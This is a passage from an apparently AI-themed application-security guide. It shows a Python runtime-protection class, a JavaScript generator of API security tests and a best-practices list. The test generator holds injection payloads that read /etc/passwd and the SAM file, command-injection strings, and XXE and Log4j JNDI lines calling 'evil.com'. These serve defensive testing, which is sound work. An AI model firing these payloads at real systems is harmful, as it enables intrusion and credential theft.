                    query = safe_query
                else:
                    raise SecurityException("Non-parameterized query blocked")
            
            # Check for dangerous operations
            dangerous_ops = ['DROP', 'TRUNCATE', 'DELETE FROM', 'UPDATE']
            for op in dangerous_ops:
                if op in query.upper() and not self.is_whitelisted_query(query):
                    # Require additional authentication
                    if not self.verify_privileged_operation():
                        raise SecurityException(f"Dangerous operation {op} blocked")
            
            return query_func(query, *args, **kwargs)
        
        return wrapper
    
    def protect_file_access(self, file_func):
        """Protect file system access"""
        
        @wraps(file_func)
        def wrapper(filepath, *args, **kwargs):
            # Normalize path
            normalized_path = os.path.normpath(filepath)
            abs_path = os.path.abspath(normalized_path)
            
            # Check for path traversal
            if '../' in filepath or not abs_path.startswith(self.get_safe_base_path()):
                self.block_execution({
                    'type': 'PATH_TRAVERSAL',
                    'path': filepath
                }, 1.0)
                raise SecurityException("Path traversal attempt blocked")
            
            # Check file extensions
            if self.is_dangerous_file_type(abs_path):
                raise SecurityException("Access to dangerous file type blocked")
            
            # Monitor file access patterns
            self.monitor_file_access(abs_path)
            
            return file_func(abs_path, *args, **kwargs)
        
        return wrapper
    
    def behavioral_analysis(self):
        """Continuous behavioral analysis thread"""
        
        while True:
            # Analyze patterns over time windows
            patterns = self.analyze_patterns()
            
            # Detect anomalies
            anomalies = []
            
            # Sudden spike in activity
            if patterns['request_rate'] > patterns['avg_request_rate'] * 10:
                anomalies.append({
                    'type': 'TRAFFIC_SPIKE',
                    'severity': 'High',
                    'rate': patterns['request_rate']
                })
            
            # Unusual access patterns
            if patterns['unique_ips'] > patterns['avg_unique_ips'] * 5:
                anomalies.append({
                    'type': 'DISTRIBUTED_ATTACK',
                    'severity': 'Critical',
                    'ips': patterns['unique_ips']
                })
            
            # Process anomalies
            for anomaly in anomalies:
                self.handle_anomaly(anomaly)
            
            time.sleep(60)  # Analyze every minute
    
    def auto_respond(self, threat):
        """Automated threat response"""
        
        response_actions = {
            'SQL_INJECTION': [
                self.block_ip,
                self.alert_security_team,
                self.enable_waf_rule
            ],
            'BRUTE_FORCE': [
                self.enable_rate_limiting,
                self.require_captcha,
                self.temporary_lockout
            ],
            'DATA_EXFILTRATION': [
                self.kill_connection,
                self.revoke_access,
                self.forensic_capture
            ]
        }
        
        # Execute response actions
        for action in response_actions.get(threat['type'], []):
            try:
                action(threat)
            except Exception as e:
                self.log_error(f"Response action failed: {e}")
    
    def generate_security_report(self):
        """Generate real-time security report"""
        
        report = {
            'timestamp': time.time(),
            'threats_blocked': len(self.blocked_requests),
            'suspicious_activities': dict(self.suspicious_activities),
            'top_threats': self.get_top_threats(),
            'risk_score': self.calculate_risk_score(),
            'recommendations': self.generate_recommendations()
        }
        
        return report

# Usage example
rasp = AIRuntimeProtection()

# Protect functions
@rasp.protect
def process_user_input(user_data):
    # Function is now protected
    return handle_data(user_data)

# Protect SQL queries
@rasp.protect_sql_query
def execute_query(query, params):
    return database.execute(query, params)

# Protect file access
@rasp.protect_file_access
def read_file(filepath):
    with open(filepath, 'r') as f:
        return f.read()
```

## 🔍 Security Testing Automation

### 5. Automated Security Test Generator

```javascript
// AI-powered security test generation

class SecurityTestGenerator {
  constructor() {
    this.testCases = [];
    this.attackVectors = this.loadAttackVectors();
  }
  
  generateSecurityTests(apiSpec) {
    // Parse API specification
    const endpoints = this.parseApiSpec(apiSpec);
    
    // Generate tests for each endpoint
    endpoints.forEach(endpoint => {
      // Authentication tests
      this.generateAuthTests(endpoint);
      
      // Input validation tests
      this.generateInputValidationTests(endpoint);
      
      // Business logic tests
      this.generateBusinessLogicTests(endpoint);
      
      // Rate limiting tests
      this.generateRateLimitTests(endpoint);
    });
    
    return this.generateTestSuite();
  }
  
  generateAuthTests(endpoint) {
    const authTests = [
      {
        name: `${endpoint.path} - Missing Authentication`,
        test: async () => {
          const response = await fetch(endpoint.url, {
            method: endpoint.method,
            headers: {
              'Content-Type': 'application/json'
              // Deliberately omit auth header
            },
            body: JSON.stringify(this.generateValidPayload(endpoint))
          });
          
          expect(response.status).toBe(401);
          expect(response.headers.get('WWW-Authenticate')).toBeTruthy();
        }
      },
      {
        name: `${endpoint.path} - Invalid Token`,
        test: async () => {
          const response = await fetch(endpoint.url, {
            method: endpoint.method,
            headers: {
              'Content-Type': 'application/json',
              'Authorization': 'Bearer invalid_token_12345'
            },
            body: JSON.stringify(this.generateValidPayload(endpoint))
          });
          
          expect(response.status).toBe(401);
        }
      },
      {
        name: `${endpoint.path} - Expired Token`,
        test: async () => {
          const expiredToken = this.generateExpiredToken();
          
          const response = await fetch(endpoint.url, {
            method: endpoint.method,
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${expiredToken}`
            },
            body: JSON.stringify(this.generateValidPayload(endpoint))
          });
          
          expect(response.status).toBe(401);
          const body = await response.json();
          expect(body.error).toContain('expired');
        }
      },
      {
        name: `${endpoint.path} - JWT Algorithm Confusion`,
        test: async () => {
          // Test for JWT algorithm confusion vulnerability
          const maliciousToken = this.generateAlgorithmConfusionToken();
          
          const response = await fetch(endpoint.url, {
            method: endpoint.method,
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${maliciousToken}`
            }
          });
          
          // Should reject tokens with 'none' algorithm
          expect(response.status).not.toBe(200);
        }
      }
    ];
    
    this.testCases.push(...authTests);
  }
  
  generateInputValidationTests(endpoint) {
    const parameters = endpoint.parameters || [];
    
    parameters.forEach(param => {
      // Generate tests based on parameter type
      const tests = this.generateParameterTests(param, endpoint);
      this.testCases.push(...tests);
    });
  }
  
  generateParameterTests(param, endpoint) {
    const tests = [];
    
    // Common injection payloads
    const injectionPayloads = {
      sql: [
        "' OR '1'='1",
        "1; DROP TABLE users--",
        "admin'--",
        "1' UNION SELECT null, username, password FROM users--"
      ],
      xss: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(`XSS`)'>"
      ],
      xxe: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>'
      ],
      commandInjection: [
        "; ls -la",
        "| whoami",
        "`id`",
        "$(cat /etc/passwd)"
      ],
      pathTraversal: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      ]
    };
    
    // SQL Injection tests
    if (param.type === 'string' || param.type === 'integer') {
      injectionPayloads.sql.forEach(payload => {
        tests.push({
          name: `${endpoint.path} - SQL Injection in ${param.name}`,
          test: async () => {
            const body = this.generateValidPayload(endpoint);
            body[param.name] = payload;
            
            const response = await this.makeAuthenticatedRequest(endpoint, body);
            
            // Should not return SQL error messages
            const responseText = await response.text();
            expect(responseText).not.toMatch(/SQL|syntax|database/i);
            
            // Should handle gracefully
            expect([400, 422]).toContain(response.status);
          }
        });
      });
    }
    
    // XSS tests
    if (param.type === 'string') {
      injectionPayloads.xss.forEach(payload => {
        tests.push({
          name: `${endpoint.path} - XSS in ${param.name}`,
          test: async () => {
            const body = this.generateValidPayload(endpoint);
            body[param.name] = payload;
            
            const response = await this.makeAuthenticatedRequest(endpoint, body);
            const responseText = await response.text();
            
            // Response should not contain unescaped payload
            expect(responseText).not.toContain(payload);
            
            // Check Content-Type header
            expect(response.headers.get('Content-Type')).toContain('application/json');
            expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
          }
        });
      });
    }
    
    // Boundary tests
    tests.push(...this.generateBoundaryTests(param, endpoint));
    
    // Type confusion tests
    tests.push(...this.generateTypeConfusionTests(param, endpoint));
    
    return tests;
  }
  
  generateBoundaryTests(param, endpoint) {
    const tests = [];
    
    if (param.type === 'integer') {
      const boundaryValues = [
        -1,
        0,
        1,
        2147483647,  // Max int32
        2147483648,  // Overflow
        -2147483648, // Min int32
        -2147483649, // Underflow
        9999999999999999, // Large number
        NaN,
        Infinity,
        -Infinity
      ];
      
      boundaryValues.forEach(value => {
        tests.push({
          name: `${endpoint.path} - Boundary test ${param.name} = ${value}`,
          test: async () => {
            const body = this.generateValidPayload(endpoint);
            body[param.name] = value;
            
            const response = await this.makeAuthenticatedRequest(endpoint, body);
            
            // Should handle gracefully
            if (!this.isValidBoundary(value, param)) {
              expect([400, 422]).toContain(response.status);
            }
          }
        });
      });
    }
    
    if (param.type === 'string') {
      const stringBoundaries = [
        '', // Empty string
        ' ', // Whitespace
        'a'.repeat(10000), // Very long string
        '\x00', // Null byte
        '\\u0000', // Unicode null
        '𠜎𠜱𠝹𠱓', // Unicode characters
        '\r\n\r\n', // CRLF injection
        '%00', // Encoded null
        '${jndi:ldap://evil.com/a}' // Log4j pattern
      ];
      
      stringBoundaries.forEach(value => {
        tests.push({
          name: `${endpoint.path} - String boundary ${param.name}`,
          test: async () => {
            const body = this.generateValidPayload(endpoint);
            body[param.name] = value;
            
            const response = await this.makeAuthenticatedRequest(endpoint, body);
            
            // Check proper validation
            if (param.minLength && value.length < param.minLength) {
              expect([400, 422]).toContain(response.status);
            }
            if (param.maxLength && value.length > param.maxLength) {
              expect([400, 422]).toContain(response.status);
            }
          }
        });
      });
    }
    
    return tests;
  }
  
  generateBusinessLogicTests(endpoint) {
    const tests = [];
    
    // IDOR (Insecure Direct Object Reference) tests
    if (endpoint.path.includes(':id') || endpoint.path.includes('{id}')) {
      tests.push({
        name: `${endpoint.path} - IDOR Test`,
        test: async () => {
          // Try to access another user's resource
          const otherUserId = this.getOtherUserId();
          const url = endpoint.url.replace(/:id|{id}/, otherUserId);
          
          const response = await fetch(url, {
            method: endpoint.method,
            headers: this.getAuthHeaders() // Using current user's token
          });
          
          // Should not allow access to other user's resources
          expect([403, 404]).toContain(response.status);
        }
      });
    }
    
    // Race condition tests
    tests.push({
      name: `${endpoint.path} - Race Condition Test`,
      test: async () => {
        const promises = [];
        const payload = this.generateValidPayload(endpoint);
        
        // Send 10 concurrent requests
        for (let i = 0; i < 10; i++) {
          promises.push(this.makeAuthenticatedRequest(endpoint, payload));
        }
        
        const responses = await Promise.all(promises);
        
        // Check for inconsistent states
        const successfulResponses = responses.filter(r => r.status === 200);
        
        // For operations that should be idempotent
        if (endpoint.idempotent) {
          expect(successfulResponses.length).toBe(1);
        }
      }
    });
    
    // Business logic specific tests
    if (endpoint.businessRules) {
      endpoint.businessRules.forEach(rule => {
        tests.push(this.generateBusinessRuleTest(rule, endpoint));
      });
    }
    
    return tests;
  }
  
  generateRateLimitTests(endpoint) {
    return [
      {
        name: `${endpoint.path} - Rate Limiting Test`,
        test: async () => {
          const requests = [];
          const rateLimit = endpoint.rateLimit || 100;
          
          // Send requests up to rate limit
          for (let i = 0; i < rateLimit + 10; i++) {
            requests.push(
              this.makeAuthenticatedRequest(endpoint, 
                this.generateValidPayload(endpoint))
            );
          }
          
          const responses = await Promise.all(requests);
          
          // Check that rate limiting kicks in
          const rateLimitedResponses = responses.filter(r => r.status === 429);
          expect(rateLimitedResponses.length).toBeGreaterThan(0);
          
          // Check rate limit headers
          const limitedResponse = rateLimitedResponses[0];
          expect(limitedResponse.headers.get('X-RateLimit-Limit')).toBeTruthy();
          expect(limitedResponse.headers.get('X-RateLimit-Remaining')).toBe('0');
          expect(limitedResponse.headers.get('Retry-After')).toBeTruthy();
        }
      }
    ];
  }
  
  generateTestSuite() {
    const suite = `
// AI-Generated Security Test Suite
// Generated at: ${new Date().toISOString()}

import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import { SecurityTestHelper } from './helpers/security-test-helper';

describe('Security Test Suite', () => {
  let helper;
  
  beforeAll(async () => {
    helper = new SecurityTestHelper();
    await helper.setup();
  });
  
  afterAll(async () => {
    await helper.teardown();
  });
  
  ${this.testCases.map(test => `
  it('${test.name}', async () => {
    ${test.test.toString().match(/\{([\s\S]*)\}/)[1]}
  });`).join('\n')}
});
`;
    
    return suite;
  }
}

// Usage
const generator = new SecurityTestGenerator();
const tests = generator.generateSecurityTests(apiSpecification);
fs.writeFileSync('security.test.js', tests);
```

## 🎯 Best Practices

1. **Defense in Depth**
   - Layer multiple security controls
   - Don't rely on a single security measure
   - Implement security at every level

2. **Continuous Security**
   - Integrate security scanning into CI/CD
   - Monitor security in production
   - Regular security assessments

3. **AI-Enhanced Detection**
   - Use ML for anomaly detection
   - Behavioral analysis for zero-day threats
   - Continuous model improvement

4. **Automated Response**
   - Implement auto-remediation where safe
   - Alert on critical findings
   - Generate actionable reports

5. **Security as Code**
   - Version control security policies
   - Automate security testing
   - Infrastructure as code security 